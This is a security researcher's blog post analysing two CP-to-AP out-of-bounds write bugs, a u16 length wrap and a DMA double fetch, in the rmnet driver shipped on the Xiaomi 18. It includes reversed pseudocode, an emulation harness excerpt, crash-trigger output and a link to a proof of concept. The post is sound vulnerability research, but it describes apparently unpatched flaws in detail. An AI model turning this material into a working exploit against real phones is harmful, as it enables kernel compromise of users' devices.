---
title: "Xiaomi 18 HyperOS - Two CP to AP oob-write in rmnet"
published: 2026-11-10
tags: ["linux", "nasm", "pwn", "0day", "poc", "research", "baseband", "kernel"]
category: "research"
image: ./xiaomi18_hyperos/main.jpg
description: Write-up about two out-of-bounds write I found in the rmnet device shipped in the Xiaomi 18
---

Credit for the pic: [XilmO@夕末](https://www.pixiv.net/en/users/19389056).

While researching baseband security, I became interested in CP-to-AP vulnerabilities, an attack surface that appears under-researched. This post focuses on Qualcomm’s [RMNET](https://docs.kernel.org/networking/device_drivers/cellular/qualcomm/rmnet.html) driver.

> rmnet driver is used for supporting the Multiplexing and aggregation Protocol (MAP). This protocol is used by all recent chipsets using Qualcomm Technologies, Inc. modems.

> Multiplexing allows for creation of logical netdevices (rmnet devices) to handle multiple private data networks (PDN) like a default internet, tethering, multimedia messaging service (MMS) or IP media subsystem (IMS). Hardware sends packets with MAP headers to rmnet. Based on the multiplexer id, rmnet routes to the appropriate PDN after removing the MAP header.

RMNET parses MAP frames carried by skbs from the modem-facing network device before passing IP payloads to the Linux network stack. Several MAP frames can be aggregated into one skb, including the nonlinear skbs handled by this vendor driver.

# Introduction

The RMNET driver is open source, and you can find it in the Linux tree ([here](https://elixir.bootlin.com/linux/v7.3.1/source/drivers/net/ethernet/qualcomm/rmnet)). Phone vendors usually ship their own versions because of the chipsets they use (in our case, the `Qualcomm Snapdragon 8 Elite Gen 6`). Even though the drivers shipped on phones are not in-tree, their source code should be released under the GPL. That's why we can look at modified drivers, such as [this repository](https://github.com/zorn-trees/android_kernel_xiaomi_sm8650-modules/tree/lineage-23.2) for the `Qualcomm Snapdragon 8 Gen 3`. The only significant difference between that repository and the shipped modules is that we are running `OS4.0.27.0 HyperOS` rather than LineageOS.

I think this is a niche and interesting attack surface that is fairly easy to fuzz and audit. I was about to start with the open-source drivers, but I ended up looking at the compiled modules from the firmware instead. I wanted to try emulation-based fuzzing rather than rely only on syzkaller, which I usually use (and which is much faster). I downloaded build `OS4.0.27.0.XFRCNXM` from [MiFirm](https://mifirm.net/download/23246): `hxxps://bn.d.miui.com/OS4.0.27.0.XFRCNXM/hongkong_images_OS4.0.27.0.XFRCNXM_20261016.0000.00_17.0_cn_8714409356.tgz`.

# The attack surface

When looking for CP-to-AP vulnerabilities, the first step is to map the code paths in the target drivers that parse data delivered over DMA. I started with RMNET because it handles MAP, but SMEM, QRTR, and GLINK are other interesting interfaces.

The firmware apparently links the rmnet device to the IPA driver (pure deduction based on the compiled modules I identified). The receive flow from the dma looks like this:
`CP/AP DMA -> IPA RX path parses the DMA and issue a list of skb -> RMNET parses the skb`. So we end up in `rmnet_rx_handler` which will iter through the received skb containing MAP packets.

While reversing the module I ended up with this layout for `rmnet_map_header`.

```c
struct rmnet_map_header
{
  unsigned __int8 flags;
  unsigned __int8 mux_id;
  unsigned __int16 pkt_len;
};
```

For this post, I'll focus on MAP command frames. The command bit in the MAP header identifies the frame, while a separate command-name field selects the operation. The commands relevant here are:
```
FLOW_DISABLE (1): stop the virtual RMNET device's transmit queue
FLOW_ENABLE  (2): wake that transmit queue
FLOW_START   (7): mark the start of a downlink batch for RMNET
FLOW_END     (8): mark the end of that batch
```

## Port flags

Most of the features of the driver depend on the existing port flags the device has been initialized during the WDA negociation. The Network Interface Control Manager (NICM) will run after the boot startup a negociation with the WDA (the baseband) to know which kind of features and protocol versions he can handle and according to this negociation it will initilize the port flags of the rmnet device. From an attacker perspective if we need to trigger a code path which is not enabled by the current configuration we can still *force* a renegociation by specific QRTR packets through SMEM (which is not too difficult given we have control over the DMA). These are the possible outcomes of a nicm negociation I identified:
| Profile | Full flags | receive behavior |
| --- | ---: | --- |
| Default, everything accepted | `0xB4000071` | Fragmented path for nonlinear skb; otherwise MAP deaggregation with DL v5 |
| Default, DL aggregation rejected but UL accepted | `0xB4000070` | Fragmented path for nonlinear skb; otherwise direct MAP ingress |
| Default, UL/DL fallback to 5, aggregation accepted | `0xB4000001` | No fragmented-header path; MAP deaggregation without v4/v5 checksum |
| Target 58, requested DL aggregation accepted | `0x34000061` | Fragmented path with `0x20`; otherwise MAP deaggregation |

To reach `rmnet_frag_command`, the port needs `RMNET_FLAGS_INGRESS_MAP_COMMANDS` (`0x02`). The WDA parsing path in this NICM build does not set that bit. It can be enabled by AP-side RMNET link configuration when a virtual device is created or changed. On the fragmented path, the downlink marker handler runs first when its flags are set, so `0x02` alone does not guarantee that `rmnet_frag_command` is called.

# The findings

After spending some time reversing and building the fuzzer with unicornafl I ultimately came to two different findings within the same function: `rmnet_frag_command` (callstack: `rmnet_rx_handler` => `rmnet_frag_ingress_handler` => `rmnet_frag_command`). Here is a pseudo-code of the function:

```c
void *rmnet_frag_command(struct rmnet_frag_descriptor *desc,
                         struct rmnet_map_header *hdr,
                         struct rmnet_port *port)
{
    struct rmnet_endpoint *ep;
    struct sk_buff *skb = NULL;
    struct net_device *dev;
    struct rmnet_map_header *hdr;
    u32 pkt_len;
    u8 cmd;

    // 1. Extract command header pointer
    hdr = rmnet_frag_header_ptr(desc, 4, 16, &hdr);
    if (!hdr)
        goto out;

    cmd = *(u8 *)hdr;

...

    // cmd == 1 is FLOW_DISABLE, cmd == 2 is FLOW_ENABLE
    if (rmnet_vnd_do_flow_control(ep->vnd, (cmd == 2) ? 1 : 0) != 0 && cmd == FLOW_DISABLE)
        goto out;

    // 3. Allocate and build the ACK SKB
    dev = port->dev;
    pkt_len = __be32_to_cpu(hdr->pkt_len) >> 16;

    skb = __alloc_skb(pkt_len + 64, GFP_ATOMIC, 0, NUMA_NO_NODE);
    if (!skb)
        goto out;

    result = (void *)_alloc_skb(
                       a1: (unsigned __int16)((__builtin_bswap32(hdr->pkt_len) >> 16) + 64),
                       a2: 2080,
                       a3: 0,
                       a4: 0xFFFFFFFFLL);
    if ( result != nullptr )
    {
        v9 = (void **)result;
        v10 = *((_DWORD *)result + 52) + 32;
        *((_QWORD *)result + 28) += 32LL;
        *((_DWORD *)result + 52) = v10;
        skb_put(a1: result, a2: __builtin_bswap32(hdr->pkt_len) >> 16);
        memcpy(dest: v9[28], src: hdr, n: __builtin_bswap32(hdr->pkt_len) >> 16);
        skb_push(a1: v9, a2: 4);

        // Mark packet as an outgoing MAP command ACK 
        u8 *flags = skb_mac_header(skb) + 5;
        *flags = (*flags & 0xFC) | 0x01;
    }

    // 4. forward the ack to the ipa driver
    netif_tx_lock(dev);
    if (dev->netdev_ops && dev->netdev_ops->ndo_start_xmit) {
        dev->netdev_ops->ndo_start_xmit(skb, dev);
    }
    netif_tx_unlock(dev);

    return skb;
}
```

This function processes flow control commands, and if successful, builds and sends back to the modem an ACK packet containing the original command payload.

In this threat model we assume the attacker can write arbitrary content into the DMA shared between the CP and the AP, it means here that we can control what is written over the `hdr` struct which is basically a `map_header`. 

If you are familiar with vulnerability research the two bugs should be straightforward: 
- `(unsigned __int16)((__builtin_bswap32(hdr->pkt_len) >> 16) + 64` might wrap around because of the u16 cast which will cause an fully attacker-controlled out-of-bounds write.
- The second bug is more specific to the threat model, because we are dealing with a DMA, the attacker might abuse the double fetch between `skb_put` / `_alloc_skb` and the `memcpy`, leading to an out-of-bounds write as well.

# What's up from the public available source?

From the LineageOS driver the `skb_put`, `memcpy` and `skb_push` is just.. missing:
```c
static void rmnet_frag_send_ack(struct rmnet_map_header *qmap,
				unsigned char type,
				struct rmnet_port *port)
{
	struct rmnet_map_control_command *cmd;
	struct net_device *dev = port->dev;
	struct sk_buff *skb;
	u16 alloc_len = ntohs(qmap->pkt_len) + sizeof(*qmap);

	skb = alloc_skb(alloc_len, GFP_ATOMIC);
	if (!skb)
		return;

	skb->protocol = htons(ETH_P_MAP);
	skb->dev = dev;

	cmd = rmnet_map_get_cmd_start(skb);
	cmd->cmd_type = type & 0x03;

	netif_tx_lock(dev);
	dev->netdev_ops->ndo_start_xmit(skb, dev);
	netif_tx_unlock(dev);
}
```

And this function does not make any sense because it is emitting a skb of size zero (no `skb_push` here) without populating it. The `ndo_start_xmit` will forward the skb for the IPA or MHI driver (`ipa3_wwan_xmit` and `ipa3_send` / `mhi_ndo_xmit`, I am just guessing statically) which will just drop it because the skb is empty. So this design is rather weird but at least it does not contain the vulnerable code snippets. Maybe I am missing something here, if you know what it is feel free to dm me on discord (`@nasm`).

# Emulation

There is nothing special with the emulator, the extern kernel functions are emulated very simply, the indirect call to `ndo_start_xmit` is skipped and we trigger the double fetch when the memcpy is firing:
```py
def _code_hook(self, uc, address, size, _):
    self.insns += 1
    if self.insns > 500000:
        raise RuntimeError("instruction budget exceeded")

    if address == RETURN_ADDR:
        self.returned = True
        uc.emu_stop()
        return
    if address == 0xBA30:
        uc.reg_write(ac.UC_ARM64_REG_PC, address + 4) # xmit
        return
    if address == EXTERN["__stack_chk_fail"]:
        self._cb_stack_chk_fail()
        return
    if address == READ3_PKT_LEN:
        if self.mutate:
            self.uc.mem_write(DMA_BASE + QmapHeader.PKT_LEN_OFF,
                                QmapHeader.pkt_len_field(self.attack_len))
        return

    name = self._dispatch.get(address) # array containing all of the extern sym
    if name is None:
        return
    getattr(self, name)()
```

Which finally gives:

```
$ ./run.sh
baseline
__alloc_skb(size=80, gfp=0x820, flags=0x0, node=-1)
skb_put(skb=0x80007000, len=16)
memcpy(dst=0x80008020, src=0xff0fffd000000004, n=16)
skb_push(skb=0x80007000, len=4)
consume_skb(skb=0x80005000)

double-fetch
__alloc_skb(size=80, gfp=0x820, flags=0x0, node=-1)
skb_put(skb=0x80007000, len=16)
memcpy(dst=0x80008020, src=0xff0fffd000000004, n=600)
skb_push(skb=0x80007000, len=4)
consume_skb(skb=0x80005000)

pktlen-overflow
__alloc_skb(size=63, gfp=0x820, flags=0x0, node=-1)
skb_put(skb=0x80007000, len=65535)
memcpy(dst=0x80008020, src=0xff0fffd000000004, n=65535)
skb_push(skb=0x80007000, len=4)
consume_skb(skb=0x80005000)
```

Full code of the poc: [here](https://gist.github.com/n4sm/49468d9cfc2215b8d27b23c2fdda19f0).

# Conclusion

At first, I did not know that the vendors had to fully publish the source code, from now on I will definitly do some fuzzing and VR on other obscure chinese smartphones drivers. What was interesting with today's findings is that the Xiaomi 18 has just been released a few days ago so the timing for this research is cool enough. I hope you enjoyed this blogpost, if you have interesting VR projects plz contact me at: `kernelresearch[at]proton.me`.